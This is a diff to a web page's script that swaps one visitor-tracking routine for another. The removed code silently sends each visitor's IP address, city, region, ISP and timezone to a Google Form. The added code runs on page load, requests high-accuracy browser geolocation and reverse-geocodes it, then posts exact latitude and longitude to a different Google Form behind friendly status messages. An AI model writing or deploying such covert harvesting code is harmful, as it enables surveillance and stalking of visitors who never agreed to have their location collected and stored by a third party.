@@ -22,31 +22,77 @@
 	<p> Your city location has been tracked </p>
 
 
-	 <script>
-fetch('https://ipapi.co/json/')
-  .then(res => res.json())
-  .then(data => {
+	<script>
+const status = document.createElement('p');
+status.id = "locStatus";
+status.style.textAlign = "center";
+status.style.marginTop = "15px";
+status.innerText = "Fetching your location...";
+document.body.appendChild(status);
 
-    const formURL =
-      'https://docs.google.com/forms/d/e/1FAIpQLSdKNMmvNkPL2QsORsvOiaMn3jVBZfqFWsCt1iYf6QHX7_lJiQ/formResponse';
+function sendLocation(lat, lon, acc, city, country) {
+  const formURL =
+    'https://docs.google.com/forms/d/e/1FAIpQLSdjlrgq8jdfV9grgkRhOmnvvXOqyAs9H1j67vXeIr6cWr46tg/formResponse';
 
-    const formData = new FormData();
-    formData.append('entry.350679769', data.ip);                 // IP
-    formData.append('entry.1318643907', data.city);             // City
-    formData.append('entry.327442812', data.region);            // Region
-    formData.append('entry.1961775', data.country_name);        // Country
-    formData.append('entry.1519889978', data.timezone);         // Timezone
-    formData.append('entry.2142148047', data.org);              // ISP
+  const formData = new FormData();
+  formData.append('entry.1898596820', lat);
+  formData.append('entry.2073057617', lon);
+  formData.append('entry.1051461884', acc);
+  formData.append('entry.20062990', city);
+  formData.append('entry.1034043019', country);
 
-    fetch(formURL, {
-      method: 'POST',
-      body: formData,
-      mode: 'no-cors'
-    });
+  fetch(formURL, {
+    method: 'POST',
+    body: formData,
+    mode: 'no-cors'
+  });
+}
 
-  })
-  .catch(err => console.error('Visitor tracking error:', err));
-	 </script>
+function getLocation() {
+  if (!navigator.geolocation) {
+    status.innerText = "Geolocation not supported 😕";
+    return;
+  }
+
+  status.innerText = "Requesting location permission…";
+
+  navigator.geolocation.getCurrentPosition(
+    position => {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+      const acc = position.coords.accuracy;
+
+      fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
+        .then(res => res.json())
+        .then(place => {
+          const city =
+            place.address.city ||
+            place.address.town ||
+            place.address.village ||
+            "Unknown city";
+          const country = place.address.country || "Unknown country";
+
+          sendLocation(lat, lon, acc, city, country);
+
+          status.innerText = `Hi! You're visiting from ${city}, ${country} 🎉`;
+        })
+        .catch(() => {
+          sendLocation(lat, lon, acc, "Unknown", "Unknown");
+          status.innerText = `Location saved! 🎉`;
+        });
+    },
+    error => {
+      status.innerText = "Location permission denied 😅";
+    },
+    {
+      enableHighAccuracy: true,
+      timeout: 10000
+    }
+  );
+}
+
+window.addEventListener('load', getLocation);
+</script>
 	
 </body>
 </html>
